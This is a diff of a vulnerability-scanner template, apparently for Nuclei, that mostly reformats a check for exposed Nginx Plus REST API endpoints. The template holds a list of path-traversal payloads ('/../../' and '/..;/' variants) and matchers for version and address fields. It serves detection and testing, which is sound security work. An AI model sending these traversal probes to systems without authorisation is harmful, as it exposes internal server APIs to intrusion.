@@ -1,108 +1,107 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - version
+    - build
+    - address
+    - load_timestamp
+  - part: content_type
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}{{paths}}'
+  payloads:
+    paths:
+    - /api/1/nginx
+    - /api/2/nginx
+    - /api/3/nginx
+    - /api/5/nginx
+    - /api/9/nginx
+    - /../../../../../../api/1/nginx
+    - /../../../../../../api/2/nginx
+    - /../../../../../../api/3/nginx
+    - /../../../../../../api/5/nginx
+    - /../../../../../../api/9/nginx
+    - /../../../../../api/1/nginx
+    - /../../../../../api/2/nginx
+    - /../../../../../api/3/nginx
+    - /../../../../../api/5/nginx
+    - /../../../../../api/9/nginx
+    - /../../../../api/1/nginx
+    - /../../../../api/2/nginx
+    - /../../../../api/3/nginx
+    - /../../../../api/5/nginx
+    - /../../../../api/9/nginx
+    - /../../../api/1/nginx
+    - /../../../api/2/nginx
+    - /../../../api/3/nginx
+    - /../../../api/5/nginx
+    - /../../../api/9/nginx
+    - /../../api/1/nginx
+    - /../../api/2/nginx
+    - /../../api/3/nginx
+    - /../../api/5/nginx
+    - /../../api/9/nginx
+    - /../api/1/nginx
+    - /../api/2/nginx
+    - /../api/3/nginx
+    - /../api/5/nginx
+    - /../api/9/nginx
+    - /..;/..;/..;/..;/..;/..;/api/1/nginx
+    - /..;/..;/..;/..;/..;/..;/api/2/nginx
+    - /..;/..;/..;/..;/..;/..;/api/3/nginx
+    - /..;/..;/..;/..;/..;/..;/api/5/nginx
+    - /..;/..;/..;/..;/..;/..;/api/9/nginx
+    - /..;/..;/..;/..;/..;/api/1/nginx
+    - /..;/..;/..;/..;/..;/api/2/nginx
+    - /..;/..;/..;/..;/..;/api/3/nginx
+    - /..;/..;/..;/..;/..;/api/5/nginx
+    - /..;/..;/..;/..;/..;/api/9/nginx
+    - /..;/..;/..;/..;/api/1/nginx
+    - /..;/..;/..;/..;/api/2/nginx
+    - /..;/..;/..;/..;/api/3/nginx
+    - /..;/..;/..;/..;/api/5/nginx
+    - /..;/..;/..;/..;/api/9/nginx
+    - /..;/..;/..;/api/1/nginx
+    - /..;/..;/..;/api/2/nginx
+    - /..;/..;/..;/api/3/nginx
+    - /..;/..;/..;/api/5/nginx
+    - /..;/..;/..;/api/9/nginx
+    - /..;/..;/api/1/nginx
+    - /..;/..;/api/2/nginx
+    - /..;/..;/api/3/nginx
+    - /..;/..;/api/5/nginx
+    - /..;/..;/api/9/nginx
+    - /..;/api/1/nginx
+    - /..;/api/2/nginx
+    - /..;/api/3/nginx
+    - /..;/api/5/nginx
+    - /..;/api/9/nginx
+  stop-at-first-match: true
 id: nginx-api-traversal
 info:
-  name: Nginx Plus Rest API - Traversal
   author: encodedguy
-  severity: high
-  description: |
-    Access to Nginx Plus Rest API was discovered.
-  reference:
-    - https://nginx.org/en/docs/http/ngx_http_api_module.html
-    - https://x.com/akshaysharma71/status/1825815869953552844
   classification:
     cwe-id:
-      - CWE-23
-      - CWE-73
+    - CWE-23
+    - CWE-73
+  description: 'Access to Nginx Plus Rest API was discovered.
+
+    '
   metadata:
     verified: true
+  name: Nginx Plus Rest API - Traversal
+  reference:
+  - https://nginx.org/en/docs/http/ngx_http_api_module.html
+  - https://x.com/akshaysharma71/status/1825815869953552844
+  severity: high
   tags: fuzz,lfi,misconfig,nginx,vuln
-http:
-  - matchers:
-      - condition: and
-        part: body
-        type: word
-        words:
-          - version
-          - build
-          - address
-          - load_timestamp
-      - part: content_type
-        type: word
-        words:
-          - application/json
-      - status:
-          - 200
-        # digest: 4a0a0047304502205defdb29ac69f680b1acf26f02d7463b6c80de13653a48274a5b23a50c750e710221009a0dba7c96fd9a0e533c7497f4c0034bd751761c6132c7f3236ec0ff74553ba6:922c64590222798bb761d5b6d8e72950
-
-        type: status
-    matchers-condition: and
-    method: GET
-    path:
-      - '{{BaseURL}}{{paths}}'
-    payloads:
-      paths:
-        - /api/1/nginx
-        - /api/2/nginx
-        - /api/3/nginx
-        - /api/5/nginx
-        - /api/9/nginx
-        - /../../../../../../api/1/nginx
-        - /../../../../../../api/2/nginx
-        - /../../../../../../api/3/nginx
-        - /../../../../../../api/5/nginx
-        - /../../../../../../api/9/nginx
-        - /../../../../../api/1/nginx
-        - /../../../../../api/2/nginx
-        - /../../../../../api/3/nginx
-        - /../../../../../api/5/nginx
-        - /../../../../../api/9/nginx
-        - /../../../../api/1/nginx
-        - /../../../../api/2/nginx
-        - /../../../../api/3/nginx
-        - /../../../../api/5/nginx
-        - /../../../../api/9/nginx
-        - /../../../api/1/nginx
-        - /../../../api/2/nginx
-        - /../../../api/3/nginx
-        - /../../../api/5/nginx
-        - /../../../api/9/nginx
-        - /../../api/1/nginx
-        - /../../api/2/nginx
-        - /../../api/3/nginx
-        - /../../api/5/nginx
-        - /../../api/9/nginx
-        - /../api/1/nginx
-        - /../api/2/nginx
-        - /../api/3/nginx
-        - /../api/5/nginx
-        - /../api/9/nginx
-        - /..;/..;/..;/..;/..;/..;/api/1/nginx
-        - /..;/..;/..;/..;/..;/..;/api/2/nginx
-        - /..;/..;/..;/..;/..;/..;/api/3/nginx
-        - /..;/..;/..;/..;/..;/..;/api/5/nginx
-        - /..;/..;/..;/..;/..;/..;/api/9/nginx
-        - /..;/..;/..;/..;/..;/api/1/nginx
-        - /..;/..;/..;/..;/..;/api/2/nginx
-        - /..;/..;/..;/..;/..;/api/3/nginx
-        - /..;/..;/..;/..;/..;/api/5/nginx
-        - /..;/..;/..;/..;/..;/api/9/nginx
-        - /..;/..;/..;/..;/api/1/nginx
-        - /..;/..;/..;/..;/api/2/nginx
-        - /..;/..;/..;/..;/api/3/nginx
-        - /..;/..;/..;/..;/api/5/nginx
-        - /..;/..;/..;/..;/api/9/nginx
-        - /..;/..;/..;/api/1/nginx
-        - /..;/..;/..;/api/2/nginx
-        - /..;/..;/..;/api/3/nginx
-        - /..;/..;/..;/api/5/nginx
-        - /..;/..;/..;/api/9/nginx
-        - /..;/..;/api/1/nginx
-        - /..;/..;/api/2/nginx
-        - /..;/..;/api/3/nginx
-        - /..;/..;/api/5/nginx
-        - /..;/..;/api/9/nginx
-        - /..;/api/1/nginx
-        - /..;/api/2/nginx
-        - /..;/api/3/nginx
-        - /..;/api/5/nginx
-        - /..;/api/9/nginx
-    stop-at-first-match: true
